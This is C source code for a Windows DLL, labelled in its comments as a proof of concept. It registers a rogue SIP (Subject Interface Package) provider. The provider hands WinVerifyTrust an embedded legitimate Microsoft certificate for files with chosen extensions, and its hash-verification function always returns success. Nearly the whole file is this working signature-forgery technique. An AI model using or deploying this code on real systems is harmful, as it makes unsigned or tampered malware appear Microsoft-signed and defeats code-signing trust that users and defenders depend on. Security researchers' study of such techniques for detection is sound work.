#include "MySIP.h"

HMODULE DllModuleAddress;
GUID MySIPGUID = CRYPT_SUBJTYPE_MY_IMAGE;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  UNREFERENCED_PARAMETER(fdwReason);
  UNREFERENCED_PARAMETER(lpvReserved);

  DllModuleAddress = (HMODULE) hinstDLL;

  return TRUE;
}

STDAPI DllRegisterServer(void)
{
  HRESULT result;
  SIP_ADD_NEWPROVIDER NewProvider;
  WCHAR Filename[MAX_PATH];

  result = S_OK;

  memset(&NewProvider, 0, sizeof(SIP_ADD_NEWPROVIDER));

  if (!GetModuleFileName(DllModuleAddress, Filename, MAX_PATH)) {
     goto exit;
  }

  NewProvider.cbStruct = sizeof(SIP_ADD_NEWPROVIDER);
  NewProvider.pgSubject = &MySIPGUID,
  NewProvider.pwszDLLFileName = Filename,
  NewProvider.pwszMagicNumber = NULL;
  NewProvider.pwszIsFunctionName = NULL;
  NewProvider.pwszIsFunctionNameFmt2 = L"IsMyFileExtension";
  NewProvider.pwszGetFuncName =        L"GetLegitMSSignature";
  NewProvider.pwszPutFuncName =        L"MyPutSignature";
  NewProvider.pwszCreateFuncName =     L"MyCreateHash";
  NewProvider.pwszVerifyFuncName =     L"AutoApproveHash";
  NewProvider.pwszRemoveFuncName =     L"MyDelSignature";

  if (!CryptSIPAddProvider(&NewProvider)) { goto exit; }

  goto success;

exit:

  result = GetLastError();

  if (result > 0) { result = HRESULT_FROM_WIN32(result); }

success:

  return result;
}

STDAPI DllUnregisterServer(void) {
  CryptSIPRemoveProvider(&MySIPGUID);

  return S_OK;
}

// Considering this PoC SIP is only designed to retrieve a legitimate certificate
// and validate is despite a hash mismatch, this function is not implemented.
BOOL WINAPI MyPutSignature(SIP_SUBJECTINFO *pSubjectInfo, DWORD dwEncodingType, DWORD *pdwIndex, DWORD cbSignedDataMsg, BYTE *pbSignedDataMsg) {
  UNREFERENCED_PARAMETER(pSubjectInfo);
  UNREFERENCED_PARAMETER(dwEncodingType);
  UNREFERENCED_PARAMETER(pdwIndex);
  UNREFERENCED_PARAMETER(cbSignedDataMsg);
  UNREFERENCED_PARAMETER(pbSignedDataMsg);
	
  return TRUE;
}

// Considering this PoC SIP is only designed to retrieve a legitimate certificate
// and validate is despite a hash mismatch, this function is not implemented.
BOOL WINAPI MyCreateHash(SIP_SUBJECTINFO *pSubjectInfo, DWORD *pcbIndirectData, SIP_INDIRECT_DATA *pIndirectData) {
  UNREFERENCED_PARAMETER(pSubjectInfo);
  UNREFERENCED_PARAMETER(pcbIndirectData);
  UNREFERENCED_PARAMETER(pIndirectData);

  return TRUE;
}

// Considering this PoC SIP is only designed to retrieve a legitimate certificate
// and validate is despite a hash mismatch, this function is not implemented.
BOOL WINAPI MyDelSignature(SIP_SUBJECTINFO *pSubjectInfo, DWORD dwIndex) {
  UNREFERENCED_PARAMETER(pSubjectInfo);
  UNREFERENCED_PARAMETER(dwIndex);

  return TRUE;
}

BOOL WINAPI IsMyFileExtension(WCHAR *pwszFileName, GUID *pgSubject) {
  BOOL bResult;
  INT i;
  WCHAR *SupportedExtensions[SUPPORTED_EXTENSION_COUNT];
  WCHAR *Extension;

  SupportedExtensions[0] = L"foo";
  SupportedExtensions[1] = L"bar";
  SupportedExtensions[2] = L"baz";

  bResult = FALSE;

  if (pwszFileName && pgSubject) {
    Extension = wcsrchr(pwszFileName, '.');

    if (Extension) {
      Extension++;

      for (i = 0; i < SUPPORTED_EXTENSION_COUNT; i++) {
        if (!_wcsicmp(Extension, SupportedExtensions[i])) {
          bResult = TRUE;
          memcpy(pgSubject, &MySIPGUID, sizeof(GUID));
          break;
        }
      }
    }
  } else {
    SetLastError(ERROR_INVALID_PARAMETER);
  }

  return bResult;
}

// Such a beautiful unimplemented function, IMO. This is the jedi mindtrick of hash validation. ;)
// This simply states, "I don't care what the hash of the file is. I say it matches the signature in the certificate."
BOOL WINAPI AutoApproveHash(SIP_SUBJECTINFO *pSubjectInfo, SIP_INDIRECT_DATA *pIndirectData) {
  UNREFERENCED_PARAMETER(pSubjectInfo);
  UNREFERENCED_PARAMETER(pIndirectData);
	
  return TRUE;
}

// Supplies the embedded certificate to WinVerifyTrust.
// Note: An IOC can be easily made from the "LEGITCERT" embedded resource name.
BOOL WINAPI GetLegitMSSignature(SIP_SUBJECTINFO *pSubjectInfo, DWORD *pdwEncodingType, DWORD dwIndex, DWORD *pcbSignedDataMsg, BYTE *pbSignedDataMsg) {
  HRSRC hCertResource;
  HGLOBAL hResLoaded;
  LPVOID lpResAddress;
  DWORD dwResourceSize;
  DWORD dwErrorCode;

  dwErrorCode = ERROR_SUCCESS;

  // pSubjectInfo is a required argument. I don't actually use pSubjectInfo
  // though since all this PoC does is return the same legit, MS cert.
  // pdwEncodingType is a required argument
  // dwIndex must be 0
  // pcbSignedDataMsg is a required argument
  // pbSignedDataMsg can be null
  if ((pSubjectInfo == NULL) || (pdwEncodingType == NULL) || (pcbSignedDataMsg == NULL) || (dwIndex != 0)) {
    dwErrorCode = ERROR_INVALID_PARAMETER;
    goto erroroccurred;
  }

  // Get a handle to the legitimate Microsoft certificate embedded in this DLL.
  // The certificate was embedded as a resource to facilitate a user swapping it out with another one using a	resource editor util.
  hCertResource = FindResource(DllModuleAddress, MAKEINTRESOURCE(IDR_BINARY1), L"LEGITCERT");

	if (hCertResource == NULL) {
		dwErrorCode = GetLastError();
		goto erroroccurred;
	}

	hResLoaded = LoadResource(DllModuleAddress, hCertResource);

  if (hResLoaded == NULL) {
    dwErrorCode = GetLastError();
    goto erroroccurred;
  }

  // Get the address of the resource in memory.
  lpResAddress = LockResource(hResLoaded);

  if (lpResAddress == NULL) {
    dwErrorCode = ERROR_NOT_ENOUGH_MEMORY;
    goto erroroccurred;
  }

  dwResourceSize = SizeofResource(DllModuleAddress, hCertResource);

  // Return the size of the resource even if it's zero. The caller should know regardless.
  *pcbSignedDataMsg = dwResourceSize;

  // There should always be a resource present of a non-zero size.
  if (dwResourceSize == 0) {
    dwErrorCode = GetLastError();
    goto erroroccurred;
  }

  // The first time this func is called, pbSignedDataMsg is expected to be
  // null in order to determine the proper buffer size that the caller needs to allocate.
  if ((pbSignedDataMsg == NULL) || (dwResourceSize > *pcbSignedDataMsg)) {
    dwErrorCode = ERROR_INSUFFICIENT_BUFFER;
    goto erroroccurred;
  } else {
    // Copy the resource to the signed data msg buffer.
    memcpy(pbSignedDataMsg, lpResAddress, dwResourceSize);
  }

erroroccurred:
  SetLastError(dwErrorCode);

  // Setting this is necessary in order for AutoApproveHash to ultimately be called.
  // Without this set, the returned signature will fail to decode.
  *pdwEncodingType = PKCS_7_ASN_ENCODING | X509_ASN_ENCODING;

  return dwErrorCode == ERROR_SUCCESS;
}